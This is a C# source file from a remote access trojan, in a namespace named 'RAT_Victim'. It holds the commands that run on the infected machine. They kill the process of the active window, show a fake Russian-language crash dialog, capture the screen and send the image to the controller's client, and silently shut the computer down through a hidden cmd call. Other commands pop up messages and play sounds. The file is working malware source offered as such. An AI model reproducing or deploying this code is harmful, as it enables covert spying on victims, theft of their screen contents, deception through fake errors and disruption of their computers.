﻿using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Text;
using System.Windows.Forms;

namespace RAT_Victim
{
    internal static class Commands
    {
        private static readonly ImageConverter Converter = new ImageConverter();
        private static readonly SoundPlayer Player = new SoundPlayer();

        internal static void CloseActiveWindow()
        {
            var window = WinApi.GetForegroundWindow();
            WinApi.GetWindowThreadProcessId(window, out var processId);
            var process = WinApi.OpenProcess(1, true, processId);
            WinApi.TerminateProcess(process, 0);
        }

        internal static void ShowMessageBox()
        {
            var window = WinApi.GetForegroundWindow();
            WinApi.MessageBox(window,
                "Ошибка при запуске приложения (0xc0000005). Для выхода из приложения нажмите кнопку \"OK\".",
                GetActiveWindowTitle() + " - Ошибка приложения", 0x10);
        }

        internal static void TakeScreenshot()
        {
            var screenSize = Screen.PrimaryScreen.Bounds.Size;
            var bitmap = new Bitmap(screenSize.Width, screenSize.Height);
            var graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            var data = (byte[])Converter.ConvertTo(bitmap, typeof(byte[]));
            if (data != null) Program.Client.Send(data);
        }

        internal static void Shutdown()
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo("cmd", "/C shutdown /s /t 0")
                { WindowStyle = ProcessWindowStyle.Hidden }
            };
            process.Start();
        }

        private static string GetActiveWindowTitle()
        {
            var window = WinApi.GetForegroundWindow();
            var builder = new StringBuilder();
            WinApi.GetWindowText(window, builder, builder.MaxCapacity);
            return builder.ToString();
        }

        public static void SendMessage(string message)
        {
            WinApi.MessageBox(WinApi.GetForegroundWindow(), message, GetActiveWindowTitle(), 0x40);
        }

        public static void PlaySound(Stream audioStream)
        {
            Player.Stream = audioStream;
            Player.Play();
        }
    }
}
